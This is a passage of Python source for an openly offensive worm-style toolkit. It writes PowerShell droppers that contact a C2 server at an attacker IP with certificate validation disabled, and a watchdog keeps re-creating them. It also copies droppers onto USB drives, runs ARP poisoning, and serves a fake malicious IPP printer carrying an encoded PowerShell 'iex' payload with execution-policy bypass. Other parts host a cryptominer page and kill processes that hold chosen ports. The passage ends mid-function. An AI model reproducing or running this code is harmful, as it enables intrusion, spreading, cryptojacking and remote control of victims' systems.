    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=b'miner_protection_salt',
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(passphrase.encode()))
    return Fernet(key)

# Encryption/decryption functions for general use if desired for other files
def encrypt_file(filepath, passphrase):
    if not HAS_CRYPTOGRAPHY:
        console.print("[red]Cryptography module not available. File encryption skipped.[/red]")
        return None
    loading_animation(duration=1, message=f"Encrypting {os.path.basename(filepath)}")
    cipher = derive_miner_key(passphrase)
    if cipher is None: return None
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        encrypted_data = cipher.encrypt(data)
        enc_filepath = f"{filepath}.enc"
        with open(enc_filepath, 'wb') as f:
            f.write(encrypted_data)
        console.print(f"[green]    -> {filepath} encrypted to {enc_filepath}[/green]")
        return enc_filepath
    except Exception as e:
        console.print(f"[red]    -> Encryption failed for {filepath}: {str(e)}[/red]")
        return None

def decrypt_file(filepath_enc, passphrase):
    if not HAS_CRYPTOGRAPHY:
        console.print("[red]Cryptography module not available. File decryption skipped.[/red]")
        return None
    loading_animation(duration=1, message=f"Decrypting {os.path.basename(filepath_enc)}")
    cipher = derive_miner_key(passphrase)
    if cipher is None: return None
    try:
        with open(filepath_enc, 'rb') as f:
            encrypted_data = f.read()
        decrypted_data = cipher.decrypt(encrypted_data)
        dec_filepath = filepath_enc.replace(".enc", "")
        with open(dec_filepath, 'wb') as f:
            f.write(decrypted_data)
        console.print(f"[green]    -> {filepath_enc} decrypted to {dec_filepath}[/green]")
        return dec_filepath
    except Exception as e:
        console.print(f"[red]    -> Decryption failed for {filepath_enc}: {str(e)}[/red]")
        return None

# Dummy ENCRYPTION_KEY and CIPHER if cryptography is not available
if HAS_CRYPTOGRAPHY:
    KEY_FILE = os.path.join(BACKUP_DIR, '.encryption_key')
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, 'rb') as f:
            ENCRYPTION_KEY = f.read()
    else:
        ENCRYPTION_KEY = Fernet.generate_key()
        with open(KEY_FILE, 'wb') as f:
            f.write(ENCRYPTION_KEY)
    CIPHER = Fernet(ENCRYPTION_KEY)
else:
    ENCRYPTION_KEY = b''
    CIPHER = None

# Utility functions
def loading_animation(duration=3, message="Summoning Shadows"):
    with alive_bar(int(duration * 10), title=f'ðŸ‘» {message}...') as bar:
        for _ in range(int(duration * 10)):
            time.sleep(0.1)
            bar()
    console.print(f"[grey][{time.strftime('%H:%M:%S')}] {message}... Complete.[/grey]")

def log_crash(error, stack_trace):
    try:
        with open(CRASH_LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [ERROR] {str(error)}\n")
            f.write("Traceback:\n")
            f.write(stack_trace)
            f.write("\n" + "="*80 + "\n")
    except Exception as e:
        console.print(f"[red][{time.strftime('%H:%M:%S')}] Failed to etch crash log: {str(e)}[/red]")

def is_valid_ip(ip):
    try:
        ip_addr = ipaddress.ip_address(ip)
        # Ensure it's an IPv4 address if ENABLE_IPV6 is False
        if not CONFIG["ENABLE_IPV6"] and ip_addr.version == 6:
            return False
        # Exclude loopback and unspecified addresses
        return not ip_addr.is_loopback and not ip_addr.is_unspecified
    except ValueError:
        return False

def save_checkpoint(scanned_count, total_ips, last_scanned_ip, scan_mode, start_ip=None, end_ip=None):
    try:
        checkpoint = {
            "scanned_count": scanned_count,
            "total_ips": total_ips,
            "last_scanned_ip": last_scanned_ip,
            "scan_mode": scan_mode,
            "start_ip": start_ip,
            "end_ip": end_ip
        }
        with open(CHECKPOINT_FILE, 'w', encoding='utf-8') as f:
            json.dump(checkpoint, f)
    except Exception as e:
        console.print(f"[red][{time.strftime('%Y-%m-%d %H:%M:%S')}] Error preserving checkpoint: {str(e)}[/red]")
        log_crash(e, traceback.format_exc())

def load_checkpoint():
    try:
        if os.path.exists(CHECKPOINT_FILE) and os.path.getsize(CHECKPOINT_FILE) > 0:
            with open(CHECKPOINT_FILE, 'r', encoding='utf-8') as f:
                checkpoint = json.load(f)
            # Validate essential keys in the checkpoint
            if all(k in checkpoint for k in ["scanned_count", "total_ips", "last_scanned_ip", "scan_mode", "start_ip", "end_ip"]):
                return checkpoint
            else:
                raise ValueError("Checkpoint file is missing required keys.")
        return None # No checkpoint file or it's empty
    except (json.JSONDecodeError, ValueError) as e:
        console.print(f"[red][{time.strftime('%Y-%m-%d %H:%M:%S')}] Checkpoint file corrupted or invalid: {str(e)}[/red]")
        log_crash(e, traceback.format_exc())
        # Attempt to remove the corrupted checkpoint file to allow a fresh start
        try:
            os.remove(CHECKPOINT_FILE)
            console.print(f"[yellow][{time.strftime('%H:%M:%S')}] Removed corrupted checkpoint file: {CHECKPOINT_FILE}[/yellow]")
        except OSError as oe:
            console.print(f"[red][{time.strftime('%H:%M:%S')}] Error removing corrupted checkpoint file: {oe}[/red]")
        return None
    except Exception as e:
        console.print(f"[red][{time.strftime('%H:%M:%S')}] Error retrieving checkpoint: {str(e)}[/red]")
        log_crash(e, traceback.format_exc())
        return None

def install_dependencies(passphrase):
    try:
        required_packages = [
            'aiohttp', 'fake_useragent', 'requests', 'rich', 'alive_progress',
        ]
        if HAS_CRYPTOGRAPHY: required_packages.extend(['cryptography'])
        if Image: required_packages.extend(['Pillow']) 
        if lsb: required_packages.extend(['stegano']) 
        if figlet_format: required_packages.extend(['pyfiglet'])
        if HAS_SCAPY: required_packages.extend(['scapy'])
        try:
            import wmi 
            required_packages.append('wmi')
            import pythoncom 
        except ImportError:
            pass 

        for package in required_packages:
            try:
                if package == 'Pillow':
                    __import__('PIL') 
                elif package == 'pyfiglet':
                    __import__('pyfiglet')
                elif package == 'alive_progress':
                    __import__('alive_progress')
                elif package == 'scapy':
                    __import__('scapy')
                elif package == 'wmi':
                    if platform.system() == 'Windows':
                        __import__('wmi')
                    else:
                        continue 
                elif package == 'pythoncom': 
                    if platform.system() == 'Windows':
                        __import__('pythoncom')
                    else:
                        continue
                else:
                    __import__(package.replace('-', '_'))
            except ImportError:
                console.print(f"[yellow][{time.strftime('%H:%M:%S')}] Installing missing Python package: {package}[/yellow]")
                try:
                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except Exception as pip_e:
                    console.print(f"[red]Failed to install {package} via pip: {pip_e}[/red]")
        
        if HAS_IPP_SERVER:
            try:
                __import__('ippserver')
            except ImportError:
                console.print(f"[yellow][{time.strftime('%H:%M:%S')}] Installing missing Python package: ippserver[/yellow]")
                try:
                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'ippserver'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except Exception as pip_e:
                    console.print(f"[red]Failed to install ippserver via pip: {pip_e}[/red]")


        console.print(f"[green][{time.strftime('%H:%M:%S')}] Core Python dependencies checked.[/green]")

        if platform.system() != 'Windows':
            try:
                subprocess.check_call(['sudo', 'apt-get', 'install', '-y', 'netcat-traditional', 'masscan', 'zmap'])
                console.print(f"[green][{time.strftime('%H:%M:%S')}] System packages installed/verified.[/green]")
            except subprocess.CalledProcessError:
                console.print(f"[yellow][{time.strftime('%H:%M:%S')}] Failed to install system packages, continuing...[/yellow]")

    except Exception as e:
        console.print(f"[red][{time.strftime('%H:%M:%S')}] Dependency summoning error: {str(e)}[/red]")
        log_crash(e, traceback.format_exc())
        raise

# Watchdog function to ensure agent persistence
def watchdog(passphrase):
    IMPLANT_FILENAME = "venom_agent_dropper.ps1" 
    
    try:
        dropper_content = f"""
$ip = "{CONFIG['ATTACKER_IP']}"
$port = "{CONFIG['ATTACKER_PORT']}"
$scheme = "https"
$agentId = "dualious-dropper-{{0}}" -f (New-Guid).ToString().SubString(0,8)
$regPath = "/api/v2/auth/login/$agentId" 
$reguri = ($scheme + '://' + $ip + ':' + $port + $regPath)

# Add basic cert pinning bypass for simplicity on initial loader
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{ $true }}

try {{
    $response = Invoke-WebRequest -UseBasicParsing -Uri $reguri -Method 'GET' -ErrorActionStop
    $aesKey = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($response.Content))
    Write-Host "Registered with C2. Agent ID: $agentId, Key received: $aesKey"
}} catch {{
    Write-Host "Failed to register with C2: $($_.Exception.Message)"
}}
"""
        local_ps_agent_path = os.path.join(os.getcwd(), IMPLANT_FILENAME)
        with open(local_ps_agent_path, 'w', encoding='utf-8') as f:
            f.write(dropper_content)
        console.print(f"[green][{time.strftime('%H:%M:%S')}] Venom PowerShell dropper written locally for watchdog monitoring.[/green]")
    except Exception as e:
        console.print(f"[red][{time.strftime('%H:%M:%S')}] Failed to write Venom PowerShell dropper locally: {str(e)}[/red]")
        log_crash(e, traceback.format_exc())
        
    while True:
        try:
            if platform.system() == 'Windows':
                if not os.path.exists(local_ps_agent_path):
                    console.print(f"[yellow][{time.strftime('%H:%M:%S')}] Watchdog: {IMPLANT_FILENAME} missing locally, attempting to rewrite for re-delivery.[/yellow]")
                    with open(local_ps_agent_path, 'w', encoding='utf-8') as f:
                        f.write(dropper_content)
                    console.print(f"[green][{time.strftime('%H:%M:%S')}] Watchdog: {IMPLANT_FILENAME} rewritten locally.[/green]")
            else: 
                if not os.path.exists(local_ps_agent_path):
                    console.print(f"[yellow][{time.strftime('%H:%M:%S')}] Watchdog: {IMPLANT_FILENAME} missing locally, attempting to rewrite for re-delivery.[/yellow]")
                    with open(local_ps_agent_path, 'w', encoding='utf-8') as f:
                        f.write(dropper_content)
                    os.chmod(local_ps_agent_path, 0o755)
                    console.print(f"[green][{time.strftime('%H:%M:%S')}] Watchdog: {IMPLANT_FILENAME} rewritten locally.[/green]")

        except Exception as e:
            console.print(f"[red][{time.strftime('%H:%M:%S')}] Watchdog error: {str(e)}[/red]")
            log_crash(e, traceback.format_exc())
        time.sleep(60) 

def usb_inject():
    if platform.system() == 'Windows':
        try:
            import pythoncom
        except ImportError:
            console.print("[red]pythoncom module not found. WMI operations will be skipped.[/red]")
            return

    IMPLANT_FILENAME = "venom_agent.ps1" 
    
    initial_ps_dropper = f"""
$ip = "{CONFIG['ATTACKER_IP']}"
$port = "{CONFIG['ATTACKER_PORT']}"
$scheme = "https"
$agentId = "usb-{{0}}" -f (New-Guid).ToString().SubString(0,8) 
$regPath = "/api/v2/auth/login/$agentId" 
$reguri = ($scheme + '://' + $ip + ':' + $port + $regPath)

# Add basic cert pinning bypass for simplicity on initial loader
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{ $true }}

try {{
    $response = Invoke-WebRequest -UseBasicParsing -Uri $reguri -Method 'GET' -ErrorActionStop
    Write-Host "USB Agent ($agentId) registered. Waiting for tasks from C2."
}} catch {{
    Write-Host "USB Agent ($agentId) failed to register: $($_.Exception.Message)"
}}
"""
    
    local_ps_dropper_path = os.path.join(os.getcwd(), IMPLANT_FILENAME)
    try:
        with open(local_ps_dropper_path, 'w', encoding='utf-8') as f:
            f.write(initial_ps_dropper)
        console.print(f"[green][{time.strftime('%H:%M:%S')}] Venom PowerShell dropper written to local file for USB injection.[/green]")
    except Exception as e:
        console.print(f"[red][{time.strftime('%H:%M:%S')}] Failed to write Venom PowerShell dropper to local file: {str(e)}[/red]")
        log_crash(e, traceback.format_exc())
        return 
    # [START_REMOVAL]
    # Removed due to system permissions requirement.
    # [END_REMOVAL]
    try:
        if platform.system() == 'Windows':
            try:
                import wmi 
                pythoncom.CoInitialize() 
                c = wmi.WMI()
                for drive in c.Win32_LogicalDisk(DriveType=2): 
                    mountpoint = drive.Caption + os.sep
                    if not os.path.exists(f"{mountpoint}{IMPLANT_FILENAME}"):
                        try:
                            shutil.copy(local_ps_dropper_path, f"{mountpoint}{IMPLANT_FILENAME}")
                            console.print(f"[green][{time.strftime('%H:%M:%S')}] Injected Venom PowerShell dropper into USB at {mountpoint}[/green]")
                        except Exception as e:
                            console.print(f"[red][{time.strftime('%H:%M:%S')}] Error copying to USB at {mountpoint}: {str(e)}[/red]")
                            log_crash(e, traceback.format_exc())
                pythoncom.CoUninitialize() 
            except ImportError:
                console.print("[red]WMI module not found. USB injection on Windows skipped.[/red]")
            except Exception as e:
                console.print(f"[red]Error during Windows USB detection: {e}[/red]")
                log_crash(e, traceback.format_exc())
        else: 
            for dev in glob.glob('/dev/sd[h-z][0-9]'):
                if os.path.exists(dev):
                    mountpoint = subprocess.getoutput(f"findmnt -n -o TARGET --source {dev}")
                    if mountpoint: 
                        if not os.path.exists(f"{mountpoint}/{IMPLANT_FILENAME}"):
                            shutil.copy(local_ps_dropper_path, f"{mountpoint}/{IMPLANT_FILENAME}")
                            os.chmod(f"{mountpoint}/{IMPLANT_FILENAME}", 0o755) 
                            console.print(f"[green][{time.strftime('%H:%M:%S')}] Injected Venom PowerShell dropper into USB at {mountpoint}[/green]")
                        else:
                            console.print(f"[grey][{time.strftime('%H:%H:%S')}] Venom PowerShell dropper already exists on USB at {mountpoint}.[/grey]")
    except Exception as e:
        console.print(f"[red][{time.strftime('%H:%M:%S')}] USB injection general error: {str(e)}[/red]")
        log_crash(e, traceback.format_exc())
    finally:
        if os.path.exists(local_ps_dropper_path):
            try:
                os.remove(local_ps_dropper_path)
                console.print(f"[grey][{time.strftime('%H:%M:%S')}] Cleaned up local PowerShell dropper file.[/grey]")
            except Exception as e:
                console.print(f"[red][{time.strftime('%H:%M:%S')}] Failed to clean up local PowerShell dropper file: {str(e)}[/red]")
    time.sleep(10) 

def get_default_gateway_ip():
    """Attempts to get the default gateway IP address of the local system."""
    if not HAS_SCAPY:
        console.print("[red]Cannot get default gateway: Scapy not available.[/red]")
        return None
    
    try:
        routes = scapy.conf.route.routes
        for route_entry in routes:
            if str(route_entry[0]) == '0.0.0.0' and str(route_entry[1]) == '0.0.0.0':
                gateway_ip = str(route_entry[2])
                if gateway_ip and gateway_ip != '0.0.0.0':
                    console.print(f"[grey][{time.strftime('%H:%M:%S')}] Detected default gateway: {gateway_ip}[/grey]")
                    return gateway_ip
        console.print("[yellow]Could not automatically determine default gateway. Using fallback.[/yellow]")
        return "192.168.1.1" 
    except Exception as e:
        console.print(f"[red]Error determining default gateway: {e}. Using fallback.[/red]")
        log_crash(e, traceback.format_exc())
        return "192.168.1.1" 

def arp_poison(gateway_ip, target_ip):
    if HAS_SCAPY is False: 
        return
    try:
        attacker_mac = None
        try:
            attacker_mac = scapy.get_if_hwaddr(scapy.conf.iface)
            if not attacker_mac or attacker_mac == "00:00:00:00:00:00":
                raise ValueError("Could not determine valid attacker MAC address.")
        except Exception as e:
            console.print(f"[red][{time.strftime('%H:%M:%S')}] ARP Poisoning Skipped: Could not determine attacker's MAC address from interface ({scapy.conf.iface}). Error: {e}[/red]")
            return

        gateway_mac = scapy.getmacbyip(gateway_ip)
        target_mac = scapy.getmacbyip(target_ip)
        
        if not gateway_mac or not isinstance(gateway_mac, str) or gateway_mac == "" or not re.match("[0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5}", gateway_mac):
            console.print(f"[red][{time.strftime('%H:%M:%S')}] ARP Poisoning Skipped: Could not resolve valid MAC for Gateway ({gateway_ip}). Ensure gateway is reachable and Scapy is properly installed/configured.[/red]")
            return
        if not target_mac or not isinstance(target_mac, str) or target_mac == "" or not re.match("[0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5}", target_mac):
            console.print(f"[red][{time.strftime('%H:%M:%S')}] ARP Poisoning Skipped: Could not resolve valid MAC for Target ({target_ip}). Ensure target is reachable and Scapy is properly installed/configured.[/red]")
            return

        arp_response_to_target = scapy.Ether(src=attacker_mac, dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=attacker_mac)
        scapy.sendp(arp_response_to_target, verbose=0, iface=scapy.conf.iface) 

        arp_response_to_gateway = scapy.Ether(src=attacker_mac, dst=gateway_mac)/scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=attacker_mac)
        scapy.sendp(arp_response_to_gateway, verbose=0, iface=scapy.conf.iface)
        
    except Exception as e:
        console.print(f"[red]ARP poisoning failed: {e}[/red]")

def start_arp_poisoning(gateway_ip, target_ip, interval=2):
    if HAS_SCAPY is False:
        console.print("[red]Cannot start ARP poisoning: Scapy not available.[/red]")
        return
    def poison_loop():
        while True:
            arp_poison(gateway_ip, target_ip)
            time.sleep(interval)
    thread = threading.Thread(target=poison_loop, daemon=True)
    thread.start()
    console.print(f"[grey]ARP poisoning started for {target_ip} via {gateway_ip}[/grey]")

async def register_agent_with_c2(agent_id, exploited_ip, session):
    """
    Registers a newly exploited IP as an agent with the C2 server.
    Returns the Base64 encoded AES key from the C2 if registration is successful.
    """
    c2_register_path = f"/api/v2/auth/login/{agent_id}" 
    c2_register_url = f"https://{CONFIG['ATTACKER_IP']}:{CONFIG['ATTACKER_PORT']}{c2_register_path}"
    
    console.print(f"[bold yellow][{time.strftime('%H:%M:%S')}] Attempting to register exploited IP {exploited_ip} as agent {agent_id} with C2: {c2_register_url}[/bold yellow]")
    try:
        telemetry_headers = {'X-Agent-Telemetry': json.dumps({'agent_ip': exploited_ip})}

        async with session.get(c2_register_url, headers=telemetry_headers, timeout=CONFIG["WEB_SCAN_TIMEOUT"], ssl=False) as response:
            if response.status == 200:
                aes_key_b64 = await response.text() 
                console.print(f"[bold green][{time.strftime('%H:%M:%S')}] Successfully registered agent {agent_id} (IP: {exploited_ip}) with C2. Received AES Key (Base64): {aes_key_b64[:10]}...[/bold green]")
                return aes_key_b64
            else:
                console.print(f"[bold red][{time.strftime('%H:%M:%S')}] Failed to register agent {agent_id} with C2. Status: {response.status}, Response: {await response.text()}[/bold red]")
                return None
    except aiohttp.ClientError as e:
        console.print(f"[bold red][{time.strftime('%H:%M:%S')}] Network error during C2 agent registration for {agent_id} (IP: {exploited_ip}): {e}[/bold red]")
        return None
    except asyncio.TimeoutError:
        console.print(f"[bold red][{time.strftime('%H:%M:%S')}] Timeout during C2 agent registration for {agent_id} (IP: {exploited_ip}).[/bold red]")
        return None
    except Exception as e:
        console.print(f"[bold red][{time.strftime('%H:%M:%S')}] Unexpected error during C2 agent registration for {agent_id} (IP: {exploited_ip}): {e}[/bold red]")
        log_crash(e, traceback.format_exc())
        return None

def post_exploit_propagation(target_ip, session):
    if HAS_SCAPY is False:
        console.print("[red]Cannot perform post-exploit propagation: Scapy not available.[/red]")
        return
    
    gateway_ip = get_default_gateway_ip()
    if not gateway_ip:
        console.print("[red]Post-exploit propagation (ARP) skipped: Could not determine default gateway IP.[/red]")
        return

class MinerHTTPRequestHandler(http.server.SimpleHTTPRequestHandler): 
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def do_GET(self):
        if self.path == '/miner.html':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            miner_html = EMBEDDED_MINER_JS 
            self.wfile.write(miner_html.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

def start_http_server():
    try:
        httpd = socketserver.TCPServer(("", CONFIG["HTTP_PORT"]), MinerHTTPRequestHandler)
        console.print(f"[grey][{time.strftime('%H:%M:%S')}] Miner Hosting server awakened on port {CONFIG['HTTP_PORT']}[/grey]")
        httpd.serve_forever()
    except Exception as e:
        console.print(f"[red][{time.strftime('%H:%M:%S')}] Miner Hosting server error: {str(e)}[/red]")
        log_crash(e, traceback.format_exc())

# IPP Server components
class MaliciousPrinter(StatelessPrinter):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)

    def get_printer_attributes(self, request=None):
        c2_ip = CONFIG['ATTACKER_IP']
        c2_port = CONFIG['ATTACKER_PORT']
        
        # Corrected f-string with proper escaping for embedded quotes
        initial_ps_dropper = f"""
$ip = "{c2_ip}"
$port = "{c2_port}"
$scheme = "https"
$agentId = "ipp-{{0}}" -f (New-Guid).ToString().SubString(0,8) 
$regPath = "/api/v2/auth/login/$agentId" 
$reguri = ($scheme + '://' + $ip + ':' + $port + $regPath)

# Add basic cert pinning bypass for simplicity on initial loader
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{ $true }}

try {{
    $response = Invoke-WebRequest -UseBasicParsing -Uri $reguri -Method 'GET' -ErrorActionStop
    Write-Host "IPP Agent ($agentId) registered. Waiting for tasks from C2."
}} catch {{
    Write-Host "IPP Agent ($agentId) failed to register: $($_.Exception.Message)"
}}
"""
        encoded_ps_script = base64.b64encode(initial_ps_dropper.encode('utf-8')).decode('utf-8')
        ps_cmd_oneliner = f"powershell.exe -NoP -NonI -Exec Bypass -C \"iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded_ps_script}')))\""
        
        payload_in_attribute = f"ExecutePayload: {ps_cmd_oneliner[:200]}..." 

        return {
            (SectionEnum.printer, b"printer-uri-supported"): [f"ipp://{c2_ip}:{CONFIG['IPP_PORT']}/printers/malicious".encode('utf-8')],
            (SectionEnum.printer, b"uri-authentication-supported"): [b'none'],
            (SectionEnum.printer, b"uri-security-supported"): [b'none'],
            (SectionEnum.printer, b"printer-name"): [b"Malicious Printer"],
            (SectionEnum.printer, b"printer-info"): [f"Printer ready for service... {payload_in_attribute}".encode('utf-8')],
            (SectionEnum.printer, b"printer-make-and-model"): [b'HP LaserJet 666'],
            (SectionEnum.printer, b"printer-state"): [Enum(3)], 
            (SectionEnum.printer, b"printer-state-reasons"): [b"none"],
            (SectionEnum.printer, b"ipp-versions-supported"): [b"1.1"],
            (SectionEnum.printer, b"operations-supported"): [
                Enum(OperationEnum.print_job),
                Enum(OperationEnum.validate_job),
                Enum(OperationEnum.cancel_job),
                Enum(OperationEnum.get_job_attributes),
                Enum(OperationEnum.get_printer_attributes),
            ],
            (SectionEnum.printer, b"multiple-document-jobs-supported"): [Boolean(False)],
        }

    def do_print_job(self, request, printer_id):
        console.print(f"[green][{time.strftime('%H:%M:%S')}] IPP Print Job Received from {request.client_address} on {printer_id}. Attempting to trigger printer RCE...[/green]")
        
        initial_ps_dropper = f"""
$ip = "{CONFIG['ATTACKER_IP']}"
$port = "{CONFIG['ATTACKER_PORT']}"
$scheme = "https"
$agentId = "ipp-print-{{0}}" -f (New-Guid).ToString().SubString(0,8) 
$regPath = "/api/v2/auth/login/$agentId" 
$reguri = ($scheme + '://' + $ip + ':' + $port + $regPath)

# Add basic cert pinning bypass for simplicity on initial loader
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{ $true }}

try {{
    $response = Invoke-WebRequest -UseBasicParsing -Uri $reguri -Method 'GET' -ErrorActionStop
    Write-Host "IPP Agent ($agentId) registered. Waiting for tasks from C2."
}} catch {{
    Write-Host "IPP Agent ($agentId) failed to register: $($_.Exception.Message)"
}}
"""
        encoded_ps_script = base64.b64encode(initial_ps_dropper.encode('utf-8')).decode('utf-8')
        ps_cmd_oneliner = f"powershell.exe -NoP -NonI -Exec Bypass -C \"iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded_ps_script}')))\""
        
        console.print(f"[yellow][{time.strftime('%H:%M:%S')}] IPP (Conceptual): Payload prepared for printer RCE: {ps_cmd_oneliner[:100]}...[/yellow]")

        return super().do_print_job(request, printer_id)

class MaliciousIPPRequestHandler(BaseIPPRequestHandler):
    behaviour = MaliciousPrinter()

def start_ipp_server():
    if not HAS_IPP_SERVER:
        console.print("[red]IPP server cannot start: ippserver library not available.[/red]")
        return
    retries = 3 
    for i in range(retries):
        try:
            printer_behavior = MaliciousPrinter()
            server = IPPServer(
                ("0.0.0.0", CONFIG["IPP_PORT"]),
                MaliciousIPPRequestHandler,
                behaviour=printer_behavior
            )
            console.print(f"[grey][{time.strftime('%H:%M:%S')}] IPP server awakened on port {CONFIG['IPP_PORT']}[/grey]")
            server.serve_forever()
            break
        except OSError as e:
            console.print(f"[red][{time.strftime('%H:%M:%S')}] [ERROR] Failed to raise IPP server (Attempt {i+1}/{retries}): {e}[/red]")
            if i < retries - 1:
                console.print(f"[yellow][{time.strftime('%H:%M:%S')}] Retrying in 2 seconds...[/yellow]") 
                time.sleep(2)
            else:
                console.print(f"[red][{time.strftime('%H:%M:%S')}] All retries failed. IPP server remains dormant.[/red]")
        except Exception as e:
            console.print(f"[red][{time.strftime('%H:%M:%S')}] [ERROR] An unexpected error occurred while raising IPP server: {e}[/red]")
            log_crash(e, traceback.format_exc())
            break

# Renamed WebScanner to ScanningExploitationEngine as requested
class ScanningExploitationEngine:
    def __init__(self, session=None): 
        self.exploit_map = {'Vulns': self.dispatch_exploits}
        self.enabled_exploits = ['Vulns']
        self.vulnerable_ips = set()
        self.ipp_server_running = False
        self.http_server_running = False
        self.scanned_count = 0
        self.locker = asyncio.Lock() 
        self.running = True
        self.scanned_results = set()
        self.scan_locker = asyncio.Lock() 
        self.session = session # Store the session here

    async def get_process_name(self, pid):
        """Retrieves the process name for a given PID."""
        try:
            if platform.system() == 'Windows':
                cmd = ['tasklist', '/FI', f'PID eq {pid}', '/FO', 'CSV']
                result = await asyncio.to_thread(subprocess.run, cmd, capture_output=True, text=True, check=False)
                lines = result.stdout.strip().splitlines()
                if len(lines) > 1:
                    process_name = lines[1].split(',')[0].strip('"')
                    return process_name
            else:
                cmd = ['ps', '-p', str(pid), '-o', 'comm=']
                result = await asyncio.to_thread(subprocess.run, cmd, capture_output=True, text=True, check=False)
                return result.stdout.strip()
            return "Unknown"
        except Exception as e:
            console.print(f"[red][{time.strftime('%H:%M:%S')}] [ERROR] Error fetching process name for PID {pid}: {e}[/red]")
            log_crash(e, traceback.format_exc())
            return "Unknown"

    async def kick_listeners(self, ports=None):
        """Identifies and terminates processes listening on specified ports."""
        if ports is None:
            ports = CONFIG["TARGET_PORTS"]
        my_pid = str(os.getpid())
        try:
            if platform.system() == 'Windows':
                cmd = ['netstat', '-ano']
                result = await asyncio.to_thread(subprocess.run, cmd, capture_output=True, text=True, check=False)
                if result.returncode != 0:
                    console.print(f"[red][{time.strftime('%H:%M:%S')}] [ERROR] netstat failed: {result.stderr}[/red]")
                    return
                for line in result.stdout.splitlines():
                    if 'LISTENING' in line:
                        parts = line.split()
                        if len(parts) >= 5:
                            try:
                                local_addr = parts[1]
                                port = int(local_addr.split(':')[-1])
                                pid = parts[-1]
                                if port in ports:
                                    if pid == my_pid:
                                        continue
                                    if int(pid) in CONFIG["EXCLUDED_PIDS"]:
                                        continue
                                    process_name = await self.get_process_name(pid)
                                    if process_name in CONFIG.get("PROTECTED_PROCESSES", []):
                                        console.print(f"[grey][{time.strftime('%H:%M:%S')}] [INFO] Skipping protected system process {process_name} (PID {pid}) on port {port}[/grey]")
                                        continue
                                    console.print(f"[yellow][{time.strftime('%H:%M:%S')}] [INFO] Banishing process PID {pid} ({process_name}) on port {port}[/yellow]")
                                    try:
                                        kill_cmd = ['taskkill', '/PID', pid, '/F']
                                        await asyncio.to_thread(subprocess.run, kill_cmd, capture_output=True, text=True, check=True)
                                        console.print(f"[green][{time.strftime('%H:%M:%S')}] [SUCCESS] Successfully banished PID {pid}[/green]")
                                    except subprocess.CalledProcessError as e:
                                        console.print(f"[red][{time.strftime('%H:%M:%S')}] [ERROR] Error banishing PID {pid}: {e.stderr}[/red]")
                            except (ValueError, IndexError):
                                continue
            else:
                for port in ports:
                    try:
                        lsof_cmd = ['lsof', '-ti', f'TCP:{port}']
                        result = await asyncio.to_thread(subprocess.run, lsof_cmd, capture_output=True, text=True, check=False)
                        if result.returncode == 0:
                            pids = result.stdout.strip().splitlines()
                            for pid in pids:
                                if pid == my_pid:
                                    continue
                                if int(pid) in CONFIG["EXCLUDED_PIDS"]:
                                    continue
                                process_name = await self.get_process_name(pid)
                                console.print(f"[yellow][{time.strftime('%H:%M:%S')}] [INFO] Banishing process PID {pid} ({process_name}) on port {port}[/yellow]")
                                kill_cmd = ['kill', '-9', pid]
                                await asyncio.to_thread(subprocess.run, kill_cmd, check=True)
                                console.print(f"[green][{time.strftime('%H:%M:%S')}] [SUCCESS] Successfully banished PID {pid}[/green]")
                    except Exception as e:
                        console.print(f"[red][{time.strftime('%H:%M:%S')}] [ERROR] Error processing port {port} on Linux/macOS: {e}[/red]")
        except Exception as e:
            console.print(f"[red][{time.strftime('%H:%M:%S')}] [ERROR] Error banishing listeners: {e}[/red]")
            log_crash(e, traceback.format_exc())

    def check_ipp_server(self):
        """Checks if the local IPP server is running."""
        if not HAS_IPP_SERVER: 
            self.ipp_server_running = False
            return
        
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(1)
                result = sock.connect_ex(('127.0.0.1', CONFIG["IPP_PORT"]))
            self.ipp_server_running = (result == 0)
            if not self.ipp_server_running:
                console.print(f"[red][{time.strftime('%H:%M:%S')}] [ERROR] IPP server not active on port {CONFIG['IPP_PORT']}[/red]")
            else:
                console.print(f"[grey][{time.strftime('%H:%M:%S')}] [INFO] IPP server active on port {CONFIG['IPP_PORT']}[/grey]")
        except Exception as e:
            self.ipp_server_running = False
            console.print(f"[red][{time.strftime('%H:%M:%S')}] [ERROR] Error probing IPP server: {e}[/red]")
            log_crash(e, traceback.format_exc())

    def check_http_server(self):
        """Checks if the local HTTP server is running."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(1)
                result = sock.connect_ex(('127.0.0.1', CONFIG["HTTP_PORT"]))
            self.http_server_running = (result == 0)
            if not self.http_server_running:
                console.print(f"[red][{time.strftime('%H:%M:%S')}] [ERROR] HTTP server is not active on port {CONFIG['HTTP_PORT']}[/red]")
                return False
            console.print(f"[grey][{time.strftime('%H:%M:%S')}] [INFO] HTTP server active on port {CONFIG['HTTP_PORT']}[/grey]")
            return True
        except Exception as e:
            self.http_server_running = False
